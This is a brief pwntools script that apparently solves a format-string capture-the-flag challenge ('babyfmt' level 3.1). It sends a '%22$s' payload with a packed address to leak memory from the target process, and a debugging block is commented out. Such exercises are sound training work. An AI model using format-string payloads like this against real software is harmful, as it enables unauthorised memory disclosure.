#!/usr/bin/python
from pwn import *


def level_3_0(p):
    ''''''
    p.sendafter('Send your data!', b'%22$s       ' + p64(0x4040c0 + 0x70))


level = 3.1
p = process(f'/challenge/babyfmt_level{level}')
#p = gdb.debug(f'./babyfmt_level{level}', '''
#b read
#c
        
#disable 1
#b printf
#c
#c
#c
#c
#c
#c
#c
#''')

level_3_0(p)

p.interactive()